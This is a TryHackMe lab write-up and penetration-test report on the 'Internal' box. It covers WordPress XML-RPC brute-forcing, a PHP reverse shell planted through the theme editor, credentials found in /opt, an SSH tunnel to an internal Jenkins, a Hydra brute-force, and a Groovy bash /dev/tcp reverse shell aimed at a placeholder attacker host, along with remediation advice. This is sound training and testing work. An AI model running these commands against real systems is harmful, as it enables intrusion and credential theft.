# Internal

**Platform:** TryHackMe
**OS:** Linux
**Tags:** WordPress, WPScan, Jenkins, SSH Tunnel, Hydra, Docker, Groovy
**Date:** 2026-05-04

wpscan brute-forces the WordPress XML-RPC endpoint for admin access; a PHP shell gets www-data and SSH credentials in /opt give aubreanna. An SSH tunnel to internal Jenkins, Groovy console RCE, and plaintext root credentials in a container give host root.

## 1. Enumeration

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 22/tcp - OpenSSH 7.6p1 Ubuntu
- 80/tcp - Apache httpd 2.4.29 (Ubuntu)

Ran Gobuster to discover directories on port 80.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

Findings:
- /blog - Status 301, WordPress install
- /phpmyadmin - Status 301, Database admin panel
- /wordpress - Status 301, WordPress files

## 2. WordPress Enumeration

Ran WPScan against the WordPress instance at `/blog/` to enumerate users and check for vulnerabilities.

```bash
wpscan --url http://internal.thm/blog/ --enumerate u
```

Findings:
- Version: WordPress 5.4.2, outdated
- XML-RPC: Enabled, allows brute-forcing via xmlrpc.php
- User: admin, found via user enumeration

Brute-forced the WordPress login via XML-RPC using rockyou.txt.

```bash
wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt
```

**WordPress admin credentials found.**

## 3. Initial Foothold

Logged into the WordPress admin panel. Navigated to **Appearance - Theme Editor - 404.php (Twenty Seventeen)** and replaced the content with a PHP reverse shell.

```bash
nc -lvnp 4444
```

Triggered the shell by visiting a non-existent WordPress page:

```
http://internal.thm/blog/?p=9999
```

**Shell caught as www-data.**

Stabilised the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 4. Lateral Movement: www-data to aubreanna

Checked `/opt` for interesting files. Found a note containing SSH credentials for the user `aubreanna`.

```bash
cat /opt/wp-save.txt
```

**SSH credentials for aubreanna found in plaintext.**

```bash
ssh aubreanna@internal.thm
```

Retrieved the user flag. Also found `jenkins.txt` revealing an internal Jenkins service running on `172.17.0.2:8080` inside a Docker container.

## 5. Jenkins Exploitation via SSH Tunnel

Jenkins was only accessible internally. Set up an SSH local port forward to expose it on the attack machine.

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

Accessed Jenkins at `http://127.0.0.1:8080` in the browser. Brute-forced the login with Hydra.

```bash
hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
  http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

**Jenkins admin credentials cracked.**

Logged in. Navigated to **Manage Jenkins - Script Console** and executed a Groovy reverse shell.

```groovy
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"].execute()
```

**Shell caught as jenkins inside Docker container.**

## 6. Root

Inside the Jenkins Docker container, checked `/opt` again - found a note with root SSH credentials for the host machine.

```bash
ssh root@172.17.0.1
```

**Root access on the host machine. Retrieved root flag.**

Key Takeaway: Always check `/opt` on every user you pivot to. This box hid credentials there twice. SSH tunnelling to reach internal services is an essential skill for real engagements.

---

## Penetration Test Report

**Target:** internal.thm
**Assessment type:** External network & web application assessment
**Assessment date:** 4 May 2026
**Environment:** TryHackMe laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## Document Control

| Field | Detail |
| --- | --- |
| Report reference | THM-INT-01 |
| Version | 1.0 |
| Classification | Confidential |
| Assessment date | 4 May 2026 |
| Prepared by | Ledion Mujaj |
| Platform | TryHackMe |

### Contents

## 1. Executive Summary

### Assessment outcome

The assessment of **internal.thm** identified two critical and two high severity findings. Testing obtained administrative access to the WordPress application, code execution under the web service account, SSH access to a privileged user account, and root access on the host machine.
The initial compromise exploited a weak administrator password on the WordPress installation. XML-RPC was enabled, allowing offline brute-forcing without rate limiting. Once authenticated, the built-in theme editor was used to introduce a PHP reverse shell into the application, yielding an interactive shell as `www-data` .
Further enumeration revealed SSH credentials for the user `aubreanna` stored in plaintext at `/opt/wp-save.txt` . That account discovered an internal Jenkins service running inside a Docker container. SSH local port forwarding exposed the Jenkins login interface, which yielded to a second brute-force attack. The Jenkins Groovy Script Console delivered a shell inside the container, where a second set of plaintext credentials - this time for root - was recovered from `/opt/note.txt` .

### Impact

The recorded access chain crossed the application boundary, the local user boundary and the boundary between a containerised service and the host root account. An attacker with equivalent access could read all files accessible to the compromised accounts, exfiltrate credentials, alter application content and modify system configuration.

### Priority recommendations

1. Enforce a strong WordPress administrator password and disable XML-RPC if it is not required.
2. Restrict the WordPress theme editor to prevent execution of arbitrary PHP.
3. Remove credentials stored in plaintext on the filesystem; use a secrets management solution.
4. Enforce strong credentials and rate limiting on all internal administrative services, including Jenkins.

### Conclusion

Each finding in this chain is independently remediable. Correcting the WordPress credential weakness reduces the initial exposure, but the theme editor, plaintext credential storage and Jenkins brute-force weaknesses remain independently actionable.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| internal.thm | <TARGET_IP> | Ubuntu 18.04 LTS; web application and SSH services |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Ubuntu); WordPress at /blog |

```
nmap -sC -sV -p- -T4 <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Port 80 served the Apache default page at the root. WordPress was found at /blog via directory enumeration.

### 2.2 Approach

Testing began with service discovery and web content enumeration. Gobuster identified a WordPress installation at `/blog/` and a phpMyAdmin panel at `/phpmyadmin/` . WPScan enumerated the WordPress version, active plugins, and valid usernames.

```
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt -x php,html

/blog         (Status: 301)
/phpmyadmin   (Status: 301)
/wordpress    (Status: 301)
```

```
wpscan --url http://internal.thm/blog/ --enumerate u

[+] WordPress version 5.4.2 identified
[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
[+] user found: admin
```

With a valid username and XML-RPC confirmed enabled, WPScan's brute-force module was used against the administrator account. Following shell access, local enumeration examined user directories, running services and network connections to identify further access paths.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | WordPress XML-RPC brute-force - weak administrator password | **Critical** | 6 |
| [F-02](#f-02) | Remote code execution via WordPress theme editor | **Critical** | 7 |
| [F-03](#f-03) | Plaintext SSH credentials stored in /opt | **High** | 8 |
| [F-04](#f-04) | Jenkins brute-force and Groovy Script Console RCE | **Critical** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Brute-forced WordPress admin password via XML-RPC. | WordPress administrator |
| 02 | Injected a PHP reverse shell via the theme editor. | www-data shell |
| 03 | Recovered SSH credentials from /opt/wp-save.txt. | aubreanna (SSH) |
| 04 | Port-forwarded internal Jenkins; brute-forced admin login. | Jenkins administrator |
| 05 | Executed Groovy reverse shell via Script Console. | jenkins shell (Docker) |
| 06 | Recovered root SSH credentials from /opt/note.txt in container. | root (host) |

### 3.3 Relationship between findings

F-01 supplied the authenticated access used for F-02. F-03 provided the pivot to `aubreanna` and subsequent discovery of the Jenkins container. F-04 required the SSH tunnel established from the `aubreanna` session. Root credentials were stored in plaintext inside the Jenkins container, reflecting the same credential storage weakness as F-03.

## 4.1 WordPress XML-RPC Brute-Force

### F-01   Weak WordPress Administrator Credentials - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The WordPress administrator account used a guessable password present in the rockyou.txt wordlist. The XML-RPC endpoint was enabled and permitted unlimited authentication attempts without rate limiting, allowing offline-style brute-forcing via the `system.multicall` method. |
| Prerequisites | Network access to the HTTP service. A valid username was obtained from WordPress user enumeration, which is enabled by default. |
| Impact | Full WordPress administrative access. The administrator interface was subsequently used to introduce malicious PHP code into the application (F-02). |
| Affected system | internal.thm:80 `/blog/xmlrpc.php` |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-307](https://cwe.mitre.org/data/definitions/307.html) : Improper Restriction of Excessive Authentication Attempts |

### Steps to reproduce

1. Identify WordPress using wappalyzer or `curl http://<TARGET_IP>/wp-login.php` .
2. Run wpscan: `wpscan --url http://<TARGET_IP>/ -U admin -P /usr/share/wordlists/rockyou.txt` .
3. Observe that the administrator password is found via XML-RPC brute-force.
4. Authenticate at `/wp-login.php` and confirm admin access.

### Evidence

```
wpscan --url http://internal.thm/blog/ -U admin \
  -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / [redacted]

[!] Valid Combinations Found:
 | Username: admin, Password: [redacted]
```

Evidence E-01. WPScan brute-force result against the XML-RPC endpoint. Credential value redacted.

### Remediation

Replace the administrator password with a long, randomly generated credential stored in a password manager. Disable XML-RPC at the web server level if it is not required by any active plugin or integration. Where XML-RPC must remain enabled, apply rate limiting at the web server or WAF layer.

### Verification

Confirm that a brute-force attempt against `/blog/xmlrpc.php` is blocked or rate-limited after a small number of attempts. Verify that the administrator password does not appear in common wordlists.

## 4.2 Remote Code Execution via Theme Editor

### F-02   PHP Execution via WordPress Theme Editor - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The WordPress theme editor was accessible to the administrator account and permitted direct editing of PHP template files. A PHP reverse shell was written into the 404 error template of the active theme and executed by requesting a non-existent page. |
| Prerequisites | WordPress administrator access. Obtained via F-01. |
| Impact | Arbitrary operating-system commands execute as `www-data` . Files and credentials readable by this account are exposed; writable application files can be modified. |
| Affected system | internal.thm:80 `/blog/wp-content/themes/twentyseventeen/404.php` |
| CVSS 3.1 | **9.9** (Critical) [AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code |

### Steps to reproduce

1. Navigate to Appearance > Theme Editor in the WordPress admin dashboard.
2. Select a PHP template file (e.g. `404.php` ) and replace its contents with a PHP reverse shell.
3. Save the file and trigger it by navigating to `http://<TARGET_IP>/wp-content/themes/<theme>/404.php` .
4. Observe the reverse shell connecting to the attacker listener as `www-data` .

### Evidence

```
# PHP reverse shell written to 404.php via Appearance -> Theme Editor
# Listener started on attack machine:
nc -lvnp 4444

# Shell triggered by requesting a non-existent page:
# http://internal.thm/blog/?p=9999

# Shell received:
www-data@internal:/var/www/html/wordpress$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Evidence E-02. Reverse shell received as www-data following theme file modification.

### Remediation

Disable the WordPress theme and plugin file editors by adding `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php` . Where direct file editing is required, restrict it to a separate staging environment with no internet exposure.

### Verification

Confirm that the theme editor option is absent from the WordPress Appearance menu and that direct requests to edited template files return the expected content without executing injected code.

## 4.3 Plaintext Credentials Stored in /opt

### F-03   SSH Credentials in World-Readable File - HIGH

| Field | Assessment |
| --- | --- |
| Description | The file `/opt/wp-save.txt` contained the SSH username and password for the account `aubreanna` in plaintext. The file was readable by `www-data` , allowing lateral movement from the web service account to a privileged user session. The same credential storage pattern was repeated inside the Jenkins Docker container, where `/opt/note.txt` held root SSH credentials for the host. |
| Prerequisites | Shell access as `www-data` . Obtained via F-01 and F-02. |
| Impact | SSH access as `aubreanna` , including the user flag. Discovery of the internal Jenkins service. Root access on the host following recovery of a second credential file inside the Jenkins container. |
| Affected system | internal.thm `/opt/wp-save.txt` (host) - `/opt/note.txt` (Jenkins container) |
| CVSS 3.1 | **5.5** (Medium) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. From the `www-data` shell, enumerate `/opt` : `ls -la /opt/` .
2. Read the discovered file: `cat /opt/wp-save.txt` (or similar).
3. Observe SSH credentials stored in plaintext.
4. Authenticate over SSH as `aubreanna` using the discovered password.

### Evidence

```
www-data@internal:/$ cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something:

aubreanna:[redacted]

# SSH login:
ssh aubreanna@internal.thm

aubreanna@internal:~$ cat user.txt
[redacted]

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

Evidence E-03. Plaintext credential file readable by www-data. Credential values and flags redacted.

### Remediation

Remove credential files from the filesystem entirely. Use environment variables, a secrets manager (such as HashiCorp Vault or AWS Secrets Manager), or SSH key-based authentication. Audit `/opt` and similar directories across all hosts and containers for readable credential material.

### Verification

Confirm that no credential files exist in `/opt` or other non-standard filesystem locations readable by service accounts. Verify that service-to-service authentication uses short-lived tokens or key-based methods rather than static passwords.

## 4.4 Jenkins Admin Brute-Force and Groovy RCE

### F-04   Internal Jenkins - Brute-Forceable Admin and Script Console - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | An internal Jenkins instance running at `172.17.0.2:8080` inside a Docker container used a weak administrator password susceptible to dictionary attack. There was no account lockout or rate limiting on the login endpoint. Once authenticated, the Jenkins Script Console accepted a Groovy reverse shell, delivering code execution inside the container. |
| Prerequisites | SSH access as `aubreanna` to establish a local port forward. Obtained via F-03. |
| Impact | Code execution as `jenkins` inside the Docker container. Recovery of root SSH credentials from the container filesystem gave root access on the host machine. |
| Affected system | 172.17.0.2:8080 (internal) Jenkins Script Console - `/script` |
| CVSS 3.1 | **9.9** (Critical) [AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code |

### Steps to reproduce

1. From the `aubreanna` shell, note the internal Jenkins service at `172.17.0.2:8080` .
2. Create an SSH tunnel: `ssh -L 8080:172.17.0.2:8080 aubreanna@<TARGET_IP>` .
3. Brute-force Jenkins credentials via the login page: `hydra -l admin -P rockyou.txt http-post-form://127.0.0.1:8080/j_acegi_security_check` .
4. Navigate to Manage Jenkins > Script Console and enter a Groovy reverse shell: `def cmd = "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1".execute()` .
5. Observe a reverse shell as root inside the Jenkins container.

### Evidence

```
# SSH local port forward to expose Jenkins on attack machine:
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm

# Hydra brute-force against Jenkins login:
hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
  http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"

[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check
[8080][http-post-form] host: 127.0.0.1   login: admin   password: [redacted]

# Groovy reverse shell via Manage Jenkins -> Script Console:
def cmd = ["bash","-c","bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"].execute()

# Shell received:
jenkins@jenkins:/$ id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

jenkins@jenkins:/$ cat /opt/note.txt
Aubreanna,

Will wanted these credentials for jenkins admin:
root:[redacted]

# SSH as root on the host:
ssh root@172.17.0.1

root@internal:~# cat /root/root.txt
[redacted]
```

Evidence E-04. Jenkins brute-force result, Groovy execution, and root credential recovery. All credential values and flags redacted.

### Remediation

Replace the Jenkins administrator password with a randomly generated credential. Implement account lockout or CAPTCHA on the login endpoint. Restrict Script Console access to a named group of authorised administrators. Apply network-level controls to prevent unapproved hosts from reaching the Jenkins interface, even internally.

### Verification

Confirm that repeated failed login attempts trigger a lockout or delay. Verify that the Script Console is accessible only to specifically authorised accounts and that no credential material is stored in readable files inside the container.

## 5. Remediation and Assessment Closeout

### 5.1 Consolidated remediation table

| Ref | Finding | Severity | Recommended action |
| --- | --- | --- | --- |
| [F-01](#f-01) | WordPress XML-RPC brute-force | **Critical** | Replace admin password; disable XML-RPC; apply rate limiting. |
| [F-02](#f-02) | PHP execution via theme editor | **Critical** | Set `DISALLOW_FILE_EDIT` in wp-config.php; prevent PHP execution in theme directories. |
| [F-03](#f-03) | Plaintext credentials in /opt | **High** | Remove credential files; use secrets management; audit all non-standard filesystem locations. |
| [F-04](#f-04) | Jenkins brute-force and Groovy RCE | **Critical** | Strong Jenkins credentials; account lockout; restrict Script Console; network-level isolation. |

### 5.2 Assessment scope and limitations

This assessment was conducted against a TryHackMe laboratory environment. The findings reflect confirmed access paths within the assessed scope. No source-code review was performed and no exhaustive enumeration of all services or configurations is claimed. The assessment does not represent a complete security evaluation of a production deployment.
